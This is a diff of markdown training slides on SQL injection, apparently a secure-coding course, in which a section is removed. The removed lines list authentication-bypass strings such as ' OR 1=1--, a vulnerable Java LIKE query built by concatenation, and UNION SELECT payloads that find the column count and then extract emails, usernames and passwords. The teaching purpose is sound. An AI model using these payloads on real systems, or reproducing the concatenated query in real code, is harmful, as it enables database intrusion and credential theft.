@@ -108,80 +108,6 @@ String query = "SELECT id FROM users " +
 
 ---
 
-# Attack Pattern Examples
-
-## Bypassing Authentication
-
-* `admin'--`
-* `admin'/*`
-* `' OR 1=1--`
-* `' OR 1=1/*`
-* `') OR '1'='1`
-* `') OR ('1'='1`
-
----
-
-# :x: Vulnerable Code Example
-
-```java
-String query =
-        "SELECT * FROM books " +
-        "WHERE title LIKE '%" + req.getParameter("query") + "%'";
-```
-
-### Benign Usage
-
-For `query=owasp` this query would be created:
-
-```sql
-SELECT * FROM books WHERE title LIKE '%owasp%'
-```
-
-returning all records with "owasp" somewhere in the title.
-
----
-
-# Exploit Examples
-
-## Spying out Data
-
-:-1: This will **not** work unless both result sets coincidentally have an equal number of columns:
-
-```sql
-' UNION SELECT * FROM users--
-```
-
-:point_up: Additional closing braces might be needed depending on the original query:
-
-```sql
-') UNION SELECT * FROM users--
-```
-
----
-
-Static values are useful to probe for the right number of result set columns:
-
-```sql
-' UNION SELECT 1 FROM users--
-```
-
-```sql
-' UNION SELECT 1,2 FROM users--
-```
-
-```sql
-' UNION SELECT 1,2,3 FROM users--
-```
-
-1=:-1:, 2=:-1:, 3=:+1:!
-
-Now only some actual column names have to be guessed or inferred:
-```sql
-' UNION SELECT email,username,passwd FROM users--
-```
-
----
-
 <!-- *footer: -->
 
 # :x: Root Cause of SQL Injection
@@ -229,4 +155,3 @@ ResultSet results = pstmt.executeQuery();
 
 1. Log in as any existing user using SQL Injection (:star::star: - :star::star::star:)
 2. Order the special :christmas_tree: offer that was only available in 2014 (:star::star::star::star:)
-3. Spy out all user account credentials from the database (:star::star::star::star:)
